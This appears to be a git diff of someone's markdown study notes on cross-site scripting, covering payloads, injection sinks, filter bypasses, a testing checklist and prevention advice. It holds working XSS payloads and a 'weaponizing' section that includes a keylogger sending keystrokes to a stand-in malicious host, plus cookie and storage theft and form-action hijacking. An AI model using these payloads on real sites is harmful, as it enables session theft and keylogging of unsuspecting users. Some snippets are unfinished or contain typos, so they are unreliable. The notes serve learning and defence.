@@ -37,6 +37,31 @@ R<h1>This is NOT a PDF!</h1> <img src=x onerror=alert(document.cookie)>
 - Content security policy to prevent XSS?
 - Dangling markup injections?
 
+- Todo
+	- HTML encoding(Ex: change `<`s to `&lt;`) vs HTML sanitization(Allowing some html elements, but not all)
+
+<!-- TOC -->
+
+- [Cross Site ScriptingXSS](#cross-site-scriptingxss)
+	- [URL parameter XSS](#url-parameter-xss)
+	- [Common payloads](#common-payloads)
+	- [Sinks - Where user input is used](#sinks---where-user-input-is-used)
+		- [Inside html attributes](#inside-html-attributes)
+		- [Inside html entities](#inside-html-entities)
+		- [Inside Javascript](#inside-javascript)
+		- [Inside CSS](#inside-css)
+	- [Weaponizing XSS payloads](#weaponizing-xss-payloads)
+		- [Stealing information](#stealing-information)
+			- [Key logger](#key-logger)
+		- [What information to steal](#what-information-to-steal)
+		- [Manipulating actions](#manipulating-actions)
+	- [Prevent XSS attacks](#prevent-xss-attacks)
+	- [Bypassing common XSS filters](#bypassing-common-xss-filters)
+	- [Checklist](#checklist)
+	- [Javascript special strings syntax](#javascript-special-strings-syntax)
+
+<!-- /TOC -->
+
 # Cross Site Scripting(XSS)
 Cross site scripting(XSS) allows an attacker to get a victim to run malicious code on their browser while looking like it came from a legitimate source.
 
@@ -50,74 +75,130 @@ There are 2 type of XSS attacks.
 		- Ex: Posting a comment which other users can see.
 
 ## URL parameter XSS
-- The URL parameter has to be used within the DOM.
-- Form input sent via the URL and not the body can be used if it is inserted into the DOM.
-- Fragment identifiers(`#`s in the URL) can be used by the client to change the DOM.
-- Make sure to reload page after you change the URL parameter
-- It may not show up visually in the page, but it is still inserted into the DOM. Ex: Hidden inputs
-- **DOM-based open redirections** are useing DOM XSS to redirect the website to a url the attacker controls. These happen when the sink(where the source goes into) changes the URL.
+- The URL parameter have to be used somewhere within the DOM.
+	- They may not visually show up, but they may still be used. Ex: Hidden inputs
 
-Ex:
-```
+```javascript
 The URL
-	https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
-	or
-	https://insecure-website.com#<script>/*+Bad+stuff+here...+*/</script>
-The html output
-	<p>Status: <script>/* Bad stuff here... */</script></p>
+	https://insecure-website.com/?parameter=<script>print()</script>
+Possible html output
+	<p><script>print()</script></p>
 ```
 
-### Common client side code that gets the URL parameters for DOM-Based XSS(Called sources)
-- `document.URL`
-- `window.location` or `window.location.search`
-- `document.location` or `document.location.search`
+- Forms often use URL parameters to pass information
+- Fragment identifiers(`#`s in the URL) can be used by the client to change the DOM.
 
-- `location.search`
-- `document.referrer`
-- `location.hash`
-- `location`
-
-Regex search: `(document|window)\.(.*\.)*(location|URL)`
-
-- document.cookie
-
-How can DOM based XSS attacks be done through the cookie? How can the attacker set the victim's cookies? Can they set these cookies via the URL?
-
-document.URL
-document.documentURI
-document.URLUnencoded
-document.baseURI
-location
-document.cookie
-document.referrer
-window.name
-history.pushState
-history.replaceState
-localStorage
-sessionStorage
-IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
-Database
-
-## Common attacks
+## Common payloads
 - `<script>print()</script>`
 - `<img src onerror=print()>`
 - `<a href="javascript:print()">`
 
-[Good payload list](https://github.com/payloadbox/xss-payload-list)
+[Payload list](https://github.com/payloadbox/xss-payload-list)
 
-## Common payloads to try
+- Common payload content
 - `print()`
 - `alert()`
 - `confirm()`
 - `prompt()`
 - `console.log()`
 
-Often times it is also good to check if you can access this information
-- `document.domain`
-- `window.origin`
-- `document.cookies`
+## Sinks - Where user input is used
 
-## Common XSS filters
+### Inside html attributes
+- Ex: `<a src={user input}>Link</a>`
+	- Wait for elements to load: `<script>window.onload=function(){`
+		- Making a comment: `document.getElementByName('comment')[0].innerHTML='Comment';document.getElementById('theform').submit();`
+		- Changing action(where info is sent) of a form: `document.getElementById('theform').action='https://malicious-site.com'`
+	- `}</script>`
+	- Have to escape the `"`
+	- `javascript:print()`
+
+### Inside html entities
+- Ex: `<p>{user input}</p>`
+
+	- No escape needed
+
+### Inside Javascript
+- Ex:
+
+```javascript
+const params = new URLSearchParams(window.location.search)
+const param1 = params.get('param1')
+const param2 = params.get('param2')
+```
+
+- May need escaping
+- Common js code to get URL parameters and fragment identifies(`#`)
+	- `document.URL`, `document.documentURI`, `document.baseURI`
+	- Location(these are all the same obj): `window.location`, `document.location`, `location`
+	- JQuery: `.parseParams()`
+
+### Inside CSS
+	- Not very common
+
+## Weaponizing XSS payloads
+
+### Stealing information
+- Redirect site to malicious site: `window.location='https://malicious-site.com?info=' + info`
+- Send data to malicious site without redirect: `
+- Mouse hover over element: `<a href="https://www.youtube.com/" onmouseover="window.location='https://malicious-site.com?info=' + info">Youtube</a>`
+	- This could be blocked by Content Security Policy
+
+#### Key logger
+- Can't use `fetch` because it's blocked by CORS
+
+```javascript
+document.addEventListener('keydown', (event) => {
+    const script = document.createElement('script');
+    script.src = 'http://malicious-site.com/?key=' + encodeURIComponent(event.key);
+    document.body.appendChild(script);
+});
+```
+
+### What information to steal
+- Cookies: `escape(document.cookie)`
+	- `escape` URL encodes the cookie so it can be sent through the URL
+- Storage: `escape(JSON.stringify(localStorage))` or `escape(JSON.stringify(sessionStorage))`
+
+### Manipulating actions
+- Wait for elements to load: `<script>window.onload=function(){`
+	- Making a comment: `document.getElementByName('comment')[0].innerHTML='Comment';document.getElementById('theform').submit();`
+	- Changing action(where info is sent) of a form: `document.getElementById('theform').action='https://malicious-site.com'`
+- `}</script>`
+
+## Prevent XSS attacks
+- Pass information through the body instead of through URL parameters
+
+- Don't use react's `dangerouslySetInnerHTML`
+- Filter input as strictly as possible.
+	- Use a whitelist to only allow certain characters or words.
+	- Search and replace with HTML
+		- `&` to `&amp;`
+		- `<` to `&lt;`
+		- `>` to `&gt;`
+		- `"` to `&quot;`
+		- `'` to  `&#x27;`
+	- Search and replace with JS
+		- `&` to `\u0026`
+		- `<` to `\u003c`
+		- `>` to `\u003e`
+		- `"` to  `\u0022`
+		- `'` to  `\u0027`
+- Instead of `element.innerHTML = userInput;` use:
+	- `element.innerText = userInput;`
+	- `let textNode = document.createTextNode(userInput); element.appendChild(textNode);`
+	- Note: These DO NOT work if the element is a script element as the text will be executed as JS.
+
+- Use Content-Security Policy(CSPs)
+	- Can distinguish between legitimate inputs and injected JS code
+	- 
+
+which is an additional header in the server or specified in the html which only allows certain 
+	- This only limits what XSS can do. It might not prevent it.
+
+--------------------------------------------------------------------------------
+
+## Bypassing common XSS filters
 - Filtering out tags
 	- Test all the tag
 - Filter out events
@@ -145,6 +226,8 @@ Sometimes you need to add `">` or `'>` in front of your attacks as an escape seq
 
 - It is often times worth try to double URL encode you input.
 
+--------------------------------------------------------------------------------
+
 ## Checklist
 URl Parameter XSS:
 1. Put unique string in URL parameter: `NkgM41FlLR`
@@ -160,31 +243,10 @@ Stored XSS:
 2. Attacking account posts XSS attack.
 3. 2nd account checks the post to see if it runs.
 
-## Prevent XSS attacks
-- Prevent passing information through URL parameters. Instead use the body.
-- Don't use react's `dangerouslySetInnerHTML`
-- Filter input as strictly as possible.
-	- Use a whitelist to only allow certain characters or words.
-	- Search and replace with HTML
-		- `&` to `&amp;`
-		- `<` to `&lt;`
-		- `>` to `&gt;`
-		- `"` to `&quot;`
-		- `'` to  `&#x27;`
-	- Search and replace with JS
-		- `&` to `\u0026`
-		- `<` to `\u003c`
-		- `>` to `\u003e`
-		- `"` to  `\u0022`
-		- `'` to  `\u0027`
-- Instead of `element.innerHTML = userInput;` use:
-	- `element.innerText = userInput;`
-	- `let textNode = document.createTextNode(userInput); element.appendChild(textNode);`
-	- Note: These DO NOT work if the element is a script element as the text will be executed as JS.
-
-- Use Content-Security Policy(CSPs)
-	- Can distinguish between legitimate inputs and injected JS code
-	- 
-
-which is an additional header in the server or specified in the html which only allows certain 
-	- This only limits what XSS can do. It might not prevent it.
+## Javascript special strings syntax
+- Unicode(ASCII hex)
+	- `<`: `\u003C`
+- Hexadecimal
+	- `<`: `\x3c`
+- Octal
+	- `<`: `\074`
